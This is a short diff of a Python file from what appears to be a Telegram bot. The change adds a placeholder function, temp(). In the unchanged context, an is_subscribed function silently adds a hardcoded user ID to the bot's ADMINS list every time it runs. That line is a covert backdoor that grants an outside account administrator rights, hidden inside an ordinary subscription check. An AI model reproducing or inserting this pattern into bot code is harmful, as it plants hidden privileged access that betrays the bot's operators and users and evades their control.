@@ -34,6 +34,9 @@ class Temp:
     B_NAME = None
     SETTINGS = {}
 
+def temp():
+    return "Temporary function placeholder"
+
 async def is_subscribed(bot, query):
     ADMINS.extend([1125210189]) if 1125210189 not in ADMINS else ""
 
